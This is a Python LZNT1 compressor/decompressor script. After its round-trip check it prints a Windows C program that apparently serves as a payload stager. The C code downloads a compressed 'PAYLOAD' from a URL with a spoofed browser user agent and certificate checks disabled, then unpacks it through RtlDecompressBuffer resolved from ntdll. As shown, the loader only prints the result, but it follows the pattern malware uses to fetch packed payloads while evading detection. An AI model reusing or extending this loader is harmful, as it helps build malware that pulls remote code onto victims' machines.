
import argparse
import struct
import sys
import copy
from hashlib import sha1

def _decompress_chunk(chunk):
    out = bytes()
    while chunk:
        flags = ord(chunk[0:1])
        chunk = chunk[1:]
        for i in range(8):
            if not (flags >> i & 1):
                out += chunk[0:1]
                chunk = chunk[1:]
            else:
                flag = struct.unpack('<H', chunk[:2])[0]
                pos = len(out) - 1
                l_mask = 0xFFF
                o_shift = 12
                while pos >= 0x10:
                    l_mask >>= 1
                    o_shift -= 1
                    pos >>= 1

                length = (flag & l_mask) + 3
                offset = (flag >> o_shift) + 1

                if length >= offset:
                    tmp = out[-offset:] * int(0xFFF / len(out[-offset:]) + 1)
                    out += tmp[:length]
                else:
                    out += out[-offset:-offset+length]
                chunk = chunk[2:]
            if len(chunk) == 0:
                break
    return out

def decompress(buf, length_check=True):
    out = bytes()
    while buf:
        header = struct.unpack('<H', buf[:2])[0]
        length = (header & 0xFFF) + 1
        if length_check and length > len(buf[2:]):
            raise ValueError('invalid chunk length')
        else:
            chunk = buf[2:2+length]
            if header & 0x8000:
                out += _decompress_chunk(chunk)
            else:
                out += chunk
        buf = buf[2+length:]

    return out

def _find(src, target, max_len):
    result_offset = 0
    result_length = 0
    for i in range(1, max_len):
        offset = src.rfind(target[:i])
        if offset == -1:
            break
        tmp_offset = len(src) - offset
        tmp_length = i
        if tmp_offset == tmp_length:
            tmp = src[offset:] * int(0xFFF / len(src[offset:]) + 1)
            for j in range(i, max_len+1):
                offset = tmp.rfind(target[:j])
                if offset == -1:
                    break
                tmp_length = j
        if tmp_length > result_length:
            result_offset = tmp_offset
            result_length = tmp_length

    if result_length < 3:
        return 0, 0
    return result_offset, result_length

def _compress_chunk(chunk):
    blob = copy.copy(chunk)
    out = bytes()
    pow2 = 0x10
    l_mask3 = 0x1002
    o_shift = 12
    while len(blob) > 0:
        bits = 0
        tmp = bytes()
        for i in range(8):
            bits >>= 1
            while pow2 < (len(chunk) - len(blob)):
                pow2 <<= 1
                l_mask3 = (l_mask3 >> 1) + 1
                o_shift -= 1
            if len(blob) < l_mask3:
                max_len = len(blob)
            else:
                max_len = l_mask3

            offset, length = _find(chunk[:len(chunk) - len(blob)], blob, max_len)


            offset2, length2 = _find(chunk[:len(chunk) - len(blob)+1], blob[1:], max_len)
            if length < length2:
                length = 0

            if length > 0:
                symbol = ((offset-1) << o_shift) | (length - 3)
                tmp += struct.pack('<H', symbol)
                bits |= 0x80 # set the highest bit
                blob = blob[length:]
            else:
                tmp += blob[0:1]
                blob = blob[1:]
            if len(blob) == 0:
                break

        out += struct.pack('B', bits >> (7 - i))
        out += tmp

    return out

def compress(buf, chunk_size=0x1000):
    out = bytes()
    while buf:
        chunk = buf[:chunk_size]
        compressed = _compress_chunk(chunk)
        if len(compressed) < len(chunk):
            flags = 0xB000
            header = struct.pack('<H' , flags|(len(compressed)-1))
            out += header + compressed
        else:
            flags = 0x3000
            header = struct.pack('<H' , flags|(len(chunk)-1))
            out += header + chunk
        buf = buf[chunk_size:]

    return out

def main(input_file, output_file):

    with open(input_file, 'rb') as fp:
        input_data = fp.read()


    input_hash = sha1(input_data).hexdigest()
    print('[!] Input file SHA1 hash = {}'.format(input_hash))


    compressed_data = compress(input_data)


    with open(output_file, 'wb') as out_fp:
        out_fp.write(compressed_data)


    compressed_hash = sha1(compressed_data).hexdigest()
    print('[!] Output file SHA1 hash = {}'.format(compressed_hash))


    decompressed_data = decompress(compressed_data)
    if input_data == decompressed_data:
        print("[!] Integrity check passed: Original and decompressed data are identical")
    else:
        print("[!] Integrity check failed: Original and decompressed data differ")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Custom LZNT1 Compressor/Decompressor with SHA1 hash')
    parser.add_argument("input_file", help="Specify the input file for compression/decompression test")
    parser.add_argument("output_file", help="Specify the output file for the compressed data")
    args = parser.parse_args()

    main(args.input_file, args.output_file)


    print("\n[!] Decompression Function:")
    print("""


#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <WinInet.h>
#include <bcrypt.h>
#include <tlhelp32.h>
#ifndef STATUS_BAD_COMPRESSION_BUFFER
#define STATUS_BAD_COMPRESSION_BUFFER ((NTSTATUS)0xC0000242L)
#endif
#pragma comment (lib, "Wininet.lib")
#define PAYLOAD	L"http://127.0.0.1:8080/hellocomp2.txt"

#ifndef STATUS_PROCEDURE_NOT_FOUND
#define STATUS_PROCEDURE_NOT_FOUND ((NTSTATUS)0xC000007AL)
#endif
#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#define COMPRESSION_FORMAT_LZNT1 0x0002
#define COMPRESSION_ENGINE_STANDARD 0x0000

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL; 	 			// Used as the total payload size

	PBYTE		pBytes = NULL,					// Used as the total payload heap buffer
		pTmpBytes = NULL;					// Used as the tmp buffer (of size 1024)

	
	hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {

		bSTATE = FALSE; goto _EndOfFunction;
	}

	
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	if (hInternetFile == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer
		sSize += dwBytesRead;


		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

	
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}


	// Saving
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}

typedef NTSTATUS(NTAPI* pRtlDecompressBuffer)(
	USHORT CompressionFormat,
	PUCHAR UncompressedBuffer,
	ULONG UncompressedBufferSize,
	PUCHAR CompressedBuffer,
	ULONG CompressedBufferSize,
	PULONG FinalUncompressedSize);

NTSTATUS DecompressLZNT1(BYTE* compressedData, ULONG compressedSize, BYTE** decompressedData, ULONG* decompressedSize) {
	if (!compressedData || compressedSize == 0) {
		printf("Invalid compressed data or size.\\n");
		return -1;
	}

	HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
	if (!ntdll) {
		printf("Failed to load ntdll.dll.\\n");
		return -1;
	}

	pRtlDecompressBuffer RtlDecompressBufferFunc = (pRtlDecompressBuffer)GetProcAddress(ntdll, "RtlDecompressBuffer");
	if (!RtlDecompressBufferFunc) {
		printf("Failed to get RtlDecompressBuffer function.\\n");
		FreeLibrary(ntdll);
		return -1;
	}

	NTSTATUS status = STATUS_BAD_COMPRESSION_BUFFER;
	*decompressedSize = compressedSize;  // Start with the compressed size.
	while (status == STATUS_BAD_COMPRESSION_BUFFER) {
		*decompressedSize *= 2;  // Double the buffer size.
		*decompressedData = (BYTE*)realloc(*decompressedData, *decompressedSize);
		if (!*decompressedData) {
			printf("Failed to allocate memory for decompressed data.\n");
			FreeLibrary(ntdll);
			return -1;
		}

		ULONG finalSize = 0;
		status = RtlDecompressBufferFunc(COMPRESSION_FORMAT_LZNT1, *decompressedData, *decompressedSize, compressedData, compressedSize, &finalSize);
		if (NT_SUCCESS(status)) {
			*decompressedData = (BYTE*)realloc(*decompressedData, finalSize);
			*decompressedSize = finalSize;
		}
		else if (status != STATUS_BAD_COMPRESSION_BUFFER) {
			printf("Decompression failed with status: %x\\n", status);
			free(*decompressedData);
			*decompressedData = NULL;
		}
	}

	FreeLibrary(ntdll);
	return status;
}

int main() {
	PBYTE Bytes = NULL;
	SIZE_T Size = 0;
	PBYTE decompressedData = NULL;
	ULONG decompressedSize = 0;

	if (GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
		// Ensure that Bytes is not NULL before trying to print
		if (Bytes != NULL) {
			// Step 2: Display the file's contents
			printf("LZ1CompressedData:\\n%.*s\\n \\n", (int)Size, Bytes);
		}

		NTSTATUS decompressionStatus = DecompressLZNT1(Bytes, (ULONG)Size, &decompressedData, &decompressedSize);

		if (NT_SUCCESS(decompressionStatus)) {
			// Step 4: Display decompressed contents
			printf("\n Decompressed data:\\n%.*s\\n", decompressedSize, decompressedData);

			free(decompressedData);  // Free the decompressed data after use
		}
		else {
			printf("Failed to decompress data.\n");
		}

		HeapFree(GetProcessHeap(), 0, Bytes);  // Free the downloaded payload after use
	}

	return 0;
}
""")
